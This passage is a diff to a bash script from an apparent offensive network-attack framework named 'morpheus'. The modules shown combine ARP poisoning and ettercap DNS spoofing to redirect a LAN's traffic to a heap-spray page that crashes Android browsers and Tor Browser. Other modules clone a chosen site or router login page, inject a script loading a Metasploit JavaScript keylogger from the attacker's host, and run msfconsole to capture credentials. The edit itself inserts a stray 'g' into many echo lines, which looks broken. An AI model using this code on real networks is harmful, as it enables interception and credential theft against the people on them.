   mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
@@ -1251,7 +1251,7 @@
   sleep 2
 
 else
-  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  echo -e ${RedF}g[x]${white} Abort task${RedF}!${Reset};
   sleep 2
 fi
 }
@@ -1266,14 +1266,14 @@
 # --------------------------------------------------
 sh_stage11 () {
 echo ""
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF}    This module will crash target android browser by using a      ${BlueF}|"
-echo "${BlueF}    | ${YellowF}   Heap Spray writen in javascript (deliver under mitm+dns_spoof) ${BlueF}|"
-echo "${BlueF}    | ${YellowF}   'All [.com] domains will be redirected to the exploit webpage' ${BlueF}|"
-echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
-echo "${BlueF}    | ${YellowF}   1 - Capture a tcp/udp packet from target host to verify vuln   ${BlueF}|"
-echo "${BlueF}    | ${YellowF}   2 - If browser version its exploitable then deliver payload.   ${BlueF}|"
-echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo -e "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    | ${YellowF}    This module will crash target android browser by using a      ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}   Heap Spray writen in javascript (deliver under mitm+dns_spoof) ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}   'All [.com] domains will be redirected to the exploit webpage' ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}   1 - Capture a tcp/udp packet from target host to verify vuln   ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}   2 - If browser version its exploitable then deliver payload.   ${BlueF}|"
+echo -e "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
 # run module?
@@ -1282,13 +1282,13 @@
 
 # get user input to build filter
 rm $IPATH/logs/UserAgent.log > /dev/null 2>&1
-echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+echo -e ${BlueF}g[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
 
 
-  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Backup files needed${RedF}!${Reset};
   sleep 1
   # backup all files needed.
   cd $IPATH/bin
@@ -1302,22 +1302,22 @@
   sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
   sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
   cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
-  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
+  echo -e ${BlueF}g[☠]${white} Etter.dns configurated...${Reset};
   cd $IPATH
   sleep 1
 
   # compiling UserAgent.eft to be used in ettercap
-  echo ${BlueF}[☠]${white} Compiling UserAgent.eft${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Compiling UserAgent.eft${RedF}!${Reset};
   xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/UserAgent.eft -o $IPATH/output/UserAgent.ef && sleep 3"
   sleep 1
 
 # start apache2 webserver...
-echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
+echo -e ${BlueF}g[☠]${white} Start apache2 webserver...${Reset};
 /etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
 
       # run mitm+filter
       cd $IPATH/logs
-      echo ${BlueF}[☠]${white} Please wait, For User-Agent Capture${RedF}!${Reset}; 
+      echo -e ${BlueF}g[☠]${white} Please wait, For User-Agent Capture${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
         xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost// /$gateway// && sleep 3"
@@ -1351,38 +1351,38 @@
 else
 echo "${GreenF}    Browser report:${RedF} not vulnerable...${BlueF}"
 sleep 3
-echo "${RedF}[x] warning: running against a non-compatible target!"
+echo -e "${RedF}[x] warning: running against a non-compatible target!"
 sleep 1
 fi
 
       # run mitm+filter
       cd $IPATH/logs
-      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
-      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
+      echo -e ${BlueF}g[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo -e ${YellowF}g[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
         else
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost// /$gateway//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
         else
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost/ /$gateway/
         fi
       fi
 
 
   # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Cleaning recent files${RedF}!${Reset};
 /etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
   mv /tmp/etter.dns $Edns > /dev/null 2>&1
   mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
@@ -1395,7 +1395,7 @@
   sleep 2
 
 else
-  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  echo -e ${RedF}g[x]${white} Abort task${RedF}!${Reset};
   sleep 2
 fi
 }
@@ -1409,14 +1409,14 @@
 # -----------------------------------------------------
 sh_stage12 () {
 echo ""
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF} This module will crash target tor-browser (windows sys) using a  ${BlueF}|"
-echo "${BlueF}    | ${YellowF} Heap Spray writen in javascript (deliver under mitm + dns_spoof) ${BlueF}|"
-echo "${BlueF}    | ${YellowF}  'All [.com] domains will be redirected to the exploit webpage'  ${BlueF}|"
-echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
-echo "${BlueF}    | ${YellowF}  1 - Capture a tcp/udp packet from target host to verify vuln    ${BlueF}|"
-echo "${BlueF}    | ${YellowF}  2 - If tor version its exploitable then deliver payload.        ${BlueF}|"
-echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo -e "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    | ${YellowF} This module will crash target tor-browser (windows sys) using a  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF} Heap Spray writen in javascript (deliver under mitm + dns_spoof) ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}  'All [.com] domains will be redirected to the exploit webpage'  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}  1 - Capture a tcp/udp packet from target host to verify vuln    ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}  2 - If tor version its exploitable then deliver payload.        ${BlueF}|"
+echo -e "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
 # run module?
@@ -1425,13 +1425,13 @@
 
 # get user input to build filter
 rm $IPATH/logs/UserAgent.log > /dev/null 2>&1
-echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+echo -e ${BlueF}g[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
 
 
-  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Backup files needed${RedF}!${Reset};
   sleep 1
   # backup all files needed.
   cd $IPATH/bin
@@ -1446,22 +1446,22 @@
   sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
   sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
   cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
-  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
+  echo -e ${BlueF}g[☠]${white} Etter.dns configurated...${Reset};
   cd $IPATH
   sleep 1
 
   # compiling UserAgent.eft to be used in ettercap
-  echo ${BlueF}[☠]${white} Compiling UserAgent.eft${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Compiling UserAgent.eft${RedF}!${Reset};
   xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/UserAgent.eft -o $IPATH/output/UserAgent.ef && sleep 3"
   sleep 1
 
 # start apache2 webserver...
-echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
+echo -e ${BlueF}g[☠]${white} Start apache2 webserver...${Reset};
 /etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
 
       # run mitm+filter
       cd $IPATH/logs
-      echo ${BlueF}[☠]${white} Please wait, For User-Agent Capture${RedF}!${Reset}; 
+      echo -e ${BlueF}g[☠]${white} Please wait, For User-Agent Capture${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
         xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost// /$gateway// && sleep 3"
@@ -1491,7 +1491,7 @@
 if [ "$VeVul" != "$nOn" ]; then
 echo "${GreenF}    System report:${RedF} not vulnerable...${BlueF}"
 sleep 3
-echo "${RedF}[x] warning: running against a non-compatible target!"
+echo -e "${RedF}[x] warning: running against a non-compatible target!"
 sleep 1
 else
 echo "${GreenF}    System report: vulnerable...${BlueF}"
@@ -1500,25 +1500,25 @@
 
       # run mitm+filter
       cd $IPATH/logs
-      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
-      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
+      echo -e ${BlueF}g[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo -e ${YellowF}g[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
         else
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/tor_buffer -M ARP /$rhost// /$gateway//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
         else
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/tor_buffer -M ARP /$rhost/ /$gateway/
         fi
       fi
@@ -1526,7 +1526,7 @@
 
 
   # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Cleaning recent files${RedF}!${Reset};
 /etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
   mv /tmp/etter.dns $Edns > /dev/null 2>&1
   mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
@@ -1540,7 +1540,7 @@
   sleep 2
 
 else
-  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  echo -e ${RedF}g[x]${white} Abort task${RedF}!${Reset};
   sleep 2
 fi
 }
@@ -1556,14 +1556,14 @@
 # ---------------------------------------------------------------
 sh_stage13 () {
 echo ""
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF} This module will allow you to clone a webpage at your choice and ${BlueF}|"
-echo "${BlueF}    | ${YellowF} inject a java keylooger on it, then uses mitm + dns_spoof to be  ${BlueF}|"
-echo "${BlueF}    | ${YellowF} abble to redirect target traffic to the cloned webpage were the  ${BlueF}|"
-echo "${BlueF}    | ${YellowF} java keylooger (metasploit required) waits for input credentials.${BlueF}|"
-echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
-echo "${BlueF}    | ${YellowF} WARNING:'msfconsole required to capture credentials from target' ${BlueF}|"
-echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo -e "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    | ${YellowF} This module will allow you to clone a webpage at your choice and ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF} inject a java keylooger on it, then uses mitm + dns_spoof to be  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF} abble to redirect target traffic to the cloned webpage were the  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF} java keylooger (metasploit required) waits for input credentials.${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF} WARNING:'msfconsole required to capture credentials from target' ${BlueF}|"
+echo -e "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
 # run module?
@@ -1571,7 +1571,7 @@
 if [ "$?" -eq "0" ]; then
 
 
-echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+echo -e ${BlueF}g[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 cLon=$(zenity --title="☠ WEBPAGE TO CLONE ☠" --text "example: www.facebook.com\nchose domain name to be cloned." --entry --width 270) > /dev/null 2>&1
@@ -1579,16 +1579,16 @@
 
   # dowloading/clonning website target
   cd $IPATH/output && mkdir clone && cd clone
-  echo ${BlueF}[☠]${white} Please wait, clonning webpage${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Please wait, clonning webpage${RedF}!${Reset};
   sleep 1 && mkdir $cLon && cd $cLon
   # download -nd (no-directory) -nv (low verbose) -Q (download quota) -A (file type) -m (mirror)
   wget -qq -U Mozilla -m -nd -nv -Q 900000 -A.html,.jpg,.png,.ico,.php,.js,.css,.gif $cLon | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Cloning webpage: $cLon" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
   # inject the javascript <TAG> in cloned index.html using SED command
-  echo ${BlueF}[☠]${white} Inject javascript Into cloned webpage${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Inject javascript Into cloned webpage${RedF}!${Reset};
   sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > copy.html
   mv copy.html index.html > /dev/null 2>&1
   # copy all files to apache2 webroot
-  echo ${BlueF}[☠]${white} Copy files to apache2 webroot${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Copy files to apache2 webroot${RedF}!${Reset};
   sleep 2
   cp index.html $ApachE/index.html # NO dev/null to report file not existence
   cd ..
@@ -1597,7 +1597,7 @@
 
 
     # backup all files needed.
-    echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+    echo -e ${BlueF}g[☠]${white} Backup files needed${RedF}!${Reset};
     cd $IPATH/bin
     cp $IPATH/bin/etter.dns $IPATH/bin/etter.rb # backup (NO dev/null to report file not existence)
     cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
@@ -1605,13 +1605,13 @@
     sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
     sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
     cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
-    echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
+    echo -e ${BlueF}g[☠]${white} Etter.dns configurated...${Reset};
     cd $IPATH
     sleep 1
 
 
     # start metasploit services
-    echo ${BlueF}[☠]${white} Start metasploit services...${Reset};
+    echo -e ${BlueF}g[☠]${white} Start metasploit services...${Reset};
     service postgresql start > /dev/null 2>&1
     if [ "$RbUdB" = "YES" ]; then
     msfdb delete > /dev/null 2>&1
@@ -1619,24 +1619,24 @@
     fi
 
 # start apache2 webserver...
-echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
+echo -e ${BlueF}g[☠]${white} Start apache2 webserver...${Reset};
 /etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
 
       # run mitm+filter
-      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
-      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
+      echo -e ${BlueF}g[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo -e ${YellowF}g[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         xterm -T "MSFCONSOLE" -geometry 110x40 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $IP; set URIPATH support; exploit'" & ettercap -T -Q -i $InT3R -P dns_spoof -M arp /$rhost// /$gateway//
       else
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         xterm -T "MORPHEUS TCP/IP HIJACKING" -geometry 110x40 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $IP; set URIPATH support; exploit'" & ettercap -T -Q -i $InT3R -P dns_spoof -M arp /$rhost/ /$gateway/
       fi
 
 
   # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv $LoGmSf/*.txt $IPATH/logs > /dev/null 2>&1
   mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
   mv /tmp/etter.dns $Edns > /dev/null 2>&1
@@ -1645,7 +1645,7 @@
   cd $IPATH
 
 # start apache2 webserver...
-echo ${BlueF}[☠]${white} Stop apache2 webserver...${Reset};
+echo -e ${BlueF}g[☠]${white} Stop apache2 webserver...${Reset};
 /etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
 service postgresql stop > /dev/null 2>&1
 # check if exist any reports
@@ -1655,7 +1655,7 @@
 fi
 
 else
-  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  echo -e ${RedF}g[x]${white} Abort task${RedF}!${Reset};
   sleep 2
 fi
 }
@@ -1670,14 +1670,14 @@
 # --------------------------------------
 sh_stage14 () {
 echo ""
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF}  This module allow you to clone the modem/router login webpage   ${BlueF}|"
-echo "${BlueF}    | ${YellowF} inject a java keylooger on it, then uses mitm + dns_spoof to be  ${BlueF}|"
-echo "${BlueF}    | ${YellowF} abble to redirect target traffic to the cloned webpage were the  ${BlueF}|"
-echo "${BlueF}    | ${YellowF} java keylooger (metasploit required) waits for input credentials.${BlueF}|"
-echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
-echo "${BlueF}    | ${YellowF} WARNING:'msfconsole required to capture credentials from target' ${BlueF}|"
-echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo -e "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    | ${YellowF}  This module allow you to clone the modem/router login webpage   ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF} inject a java keylooger on it, then uses mitm + dns_spoof to be  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF} abble to redirect target traffic to the cloned webpage were the  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF} java keylooger (metasploit required) waits for input credentials.${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF} WARNING:'msfconsole required to capture credentials from target' ${BlueF}|"
+echo -e "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
 # run module?
@@ -1685,20 +1685,20 @@
 if [ "$?" -eq "0" ]; then
 
 
-echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+echo -e ${BlueF}g[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 
 
   # retrieve info about modem to inject into clone
-  echo ${BlueF}[☠]${white} Gather Info about modem webpage${RedF}! ${Reset};
+  echo -e ${BlueF}g[☠]${white} Gather Info about modem webpage${RedF}! ${Reset};
   nmap -sV -PN -p 80 $GaTe > $IPATH/output/retrieve.log
   # InjE=`cat $IPATH/output/retrieve.log | egrep -m 1 "open" | awk {'print $4,$5,$6'}`
   InjE=`cat $IPATH/output/retrieve.log | egrep -m 1 "open" | cut -d '(' -f2 | cut -d ')' -f1` # it does not grep all servernames :(
   # check if nmap have retrieved any string from scan
   if [ -z "$InjE" ]; then
-  echo ${RedF}[x] Module cant gather Info about modem webpage! ${Reset};
-  echo "${RedF}[x]${white} Using:${GreenF} 'broadband router'${white} as server name${RedF}!"
+  echo -e ${RedF}g[x] Module cant gather Info about modem webpage! ${Reset};
+  echo -e "${RedF}[x]${white} Using:${GreenF} 'broadband router'${white} as server name${RedF}!"
   InjE="broadband router"
   fi
 
@@ -1706,14 +1706,14 @@
   # building cloned login modem webpage
   cd $IPATH/bin/phishing/router-modem
   cp index.html index.rb > /dev/null 2>&1
-  echo ${BlueF}[☠]${white} Inject javascript Into clone webpage${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Inject javascript Into clone webpage${RedF}!${Reset};
   sleep 1
   sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > copy.html
   mv copy.html index.html > /dev/null 2>&1
   sed -i "s|GatWa|$GaTe|g" index.html
   sed -i "s|DiSpt|$InjE|g" index.html
   # copy all files to apache2 webroot
-  echo ${BlueF}[☠]${white} Copy files to apache2 webroot${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Copy files to apache2 webroot${RedF}!${Reset};
   sleep 2
   cp index.html $ApachE/index.html # NO dev/null to report file not existence
   cp login.html $ApachE/login.html > /dev/null 2>&1
@@ -1722,7 +1722,7 @@
   cd $IPATH
 
     # backup all files needed.
-    echo ${BlueF}[☠]${white} Backup all files needed${RedF}!${Reset};
+    echo -e ${BlueF}g[☠]${white} Backup all files needed${RedF}!${Reset};
     cd $IPATH/bin
     cp $IPATH/bin/etter.dns $IPATH/bin/etter.rb # backup (NO dev/null to report file not existence)
     cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
@@ -1731,13 +1731,13 @@
     sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
     sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
     cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
-    echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
+    echo -e ${BlueF}g[☠]${white} Etter.dns configurated...${Reset};
     cd $IPATH
     sleep 1
 
 
     # start metasploit services
-    echo ${BlueF}[☠]${white} Start metasploit services...${Reset};
+    echo -e ${BlueF}g[☠]${white} Start metasploit services...${Reset};
     service postgresql start > /dev/null 2>&1
     if [ "$RbUdB" = "YES" ]; then
     msfdb delete > /dev/null 2>&1
@@ -1745,23 +1745,23 @@
     fi
 
 # start apache2 webserver...
-echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
+echo -e ${BlueF}g[☠]${white} Start apache2 webserver...${Reset};
 /etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
 
       # run mitm+filter
-      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
-      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
+      echo -e ${BlueF}g[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo -e ${YellowF}g[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         xterm -T "MSFCONSOLE" -geometry 110x40 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $IP; set URIPATH support; exploit'" & ettercap -T -Q -i $InT3R -P dns_spoof -M arp /$rhost// /$gateway//
       else
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         xterm -T "MORPHEUS TCP/IP HIJACKING" -geometry 110x40 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $IP; set URIPATH support; exploit'" & ettercap -T -Q -i $InT3R -P dns_spoof -M arp /$rhost/ /$gateway/
       fi
 
   # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv $LoGmSf/*.txt $IPATH/logs > /dev/null 2>&1
   mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
   mv $IPATH/bin/phishing/router-modem/index.rb $IPATH/bin/phishing/router-modem/index.html
@@ -1774,7 +1774,7 @@
   cd $IPATH
 
 # start apache2 webserver...
-echo ${BlueF}[☠]${white} Stop apache2 webserver...${Reset};
+echo -e ${BlueF}g[☠]${white} Stop apache2 webserver...${Reset};
 /etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
 service postgresql stop > /dev/null 2>&1
 # check if exist any reports
@@ -1784,7 +1784,7 @@
 fi
 
 else
-  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
